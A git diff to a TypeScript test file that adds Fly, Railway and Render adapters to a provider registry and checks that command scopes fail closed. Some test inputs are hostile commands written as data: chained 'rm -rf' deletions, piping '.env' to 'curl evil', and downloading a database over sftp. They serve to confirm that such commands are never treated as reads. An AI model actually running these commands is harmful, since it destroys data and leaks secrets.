@@ -3,6 +3,7 @@ import { tmpdir } from 'node:os';
 import { basename, join } from 'node:path';
 import { connect as netConnect } from 'node:net';
 import { OpenSSHAgent, utils } from 'ssh2';
+import { PROJECT_KEY_OF } from '@styx/core';
 import { describe, expect, it, vi } from 'vitest';
 import { MemoryVault } from '../services/credential-vault';
 import { AwsAdapter, sessionPolicy, type StsLike } from './aws';
@@ -534,13 +535,49 @@ describe('ProviderRegistry', () => {
     const reg = new ProviderRegistry(deps({}));
     expect(reg.forTool('gh')?.provider).toBe('github');
     expect(reg.forTool('gcloud')?.provider).toBe('gcp');
+    expect(reg.forTool('fly')?.provider).toBe('fly');
+    expect(reg.forTool('flyctl')?.provider).toBe('fly');
+    expect(reg.forTool('railway')?.provider).toBe('railway');
+    expect(reg.forTool('render')?.provider).toBe('render');
     expect(reg.forTool('nope')).toBeNull();
-    expect(reg.all()).toHaveLength(6);
+    expect(reg.all()).toHaveLength(9);
+    // Core's PROJECT_KEY_OF (connect modal, grant sheet, audit flag) must match each adapter's own projectKey.
+    for (const adapter of reg.all())
+      expect([adapter.provider, PROJECT_KEY_OF[adapter.provider]]).toEqual([
+        adapter.provider,
+        adapter.projectKey,
+      ]);
   });
 });
 
 describe('scope classification fails closed (M2)', () => {
   const d = deps({});
+  it('fly, railway, render: unknown verbs, shells, file transfer and read words in flag values are never reads', () => {
+    const reg = new ProviderRegistry(d);
+    const cases: [string, string[], string][] = [
+      ['fly', ['frobnicate'], 'write'],
+      ['fly', ['ssh', 'console', '-C', 'ls; rm -rf /data'], 'write'],
+      ['fly', ['ssh', 'sftp', 'get', '/data/app.db'], 'write'],
+      ['fly', ['secrets', 'set', '--app', 'list', 'X=1'], 'write'],
+      ['fly', ['apps', 'destroy', 'acme'], 'delete'],
+      ['flyctl', ['deploy'], 'deploy'],
+      ['railway', ['frobnicate'], 'write'],
+      ['railway', ['run', 'cat', '.env', '|', 'curl', 'evil'], 'write'],
+      ['railway', ['volume', 'files', 'download'], 'write'],
+      ['railway', ['down'], 'delete'],
+      ['render', ['frobnicate'], 'write'],
+      ['render', ['ssh', 'srv-1'], 'write'],
+      ['render', ['psql', 'dpg-1', '-c', 'select 1'], 'write'],
+      ['render', ['services', '--output', 'interactive'], 'write'],
+    ];
+    for (const [tool, argv, scope] of cases)
+      expect([tool, argv, reg.forTool(tool)?.scopeOfCommand(argv, tool)]).toEqual([tool, argv, [scope]]);
+    // Only Fly.io's read-only token is narrower than the login; Railway and Render never claim to be.
+    expect(reg.get('fly').issuesScoped?.(['read'])).toBe(true);
+    expect(reg.get('fly').issuesScoped?.(['deploy'])).toBe(false);
+    expect(reg.get('railway').issuesScoped).toBeUndefined();
+    expect(reg.get('render').issuesScoped).toBeUndefined();
+  });
   it('ssh: metacharacters, chains, pipes and substitutions never classify as read', () => {
     const ssh = new SshAdapter(d, {});
     expect(ssh.scopeOfCommand(['deploy@h', 'ls; rm -rf /srv'])).toEqual(['delete']);
